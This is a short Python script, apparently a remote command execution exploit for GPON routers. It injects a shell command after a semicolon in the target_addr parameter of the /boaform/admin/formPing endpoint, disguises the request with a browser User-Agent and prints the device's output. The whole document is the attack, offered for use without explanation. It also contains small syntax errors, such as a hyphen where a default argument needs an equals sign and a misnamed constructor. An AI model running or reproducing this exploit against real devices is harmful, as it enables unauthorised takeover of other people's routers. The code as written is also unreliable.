import requests
class GPON_Router_1_0_11_RCE:
    def init(self):
        pass
    def attack(self,ip,cmd-"whoami"):
        headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0;Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safrai/537.36",}
        url="http://%s/boaform/admin/formPing?target_addr=;%s /waninf=1_INTERNET_R_VID_154"%(ip,cmd)
        r = requests.get(url,timeout=3,verify=False,headers=headers)
        print(r.text)
        
if __name__ == "__main__":
    test = GPON_Router_1_0_11_RCE()
    test.attack("127.0.0.1","whoami")
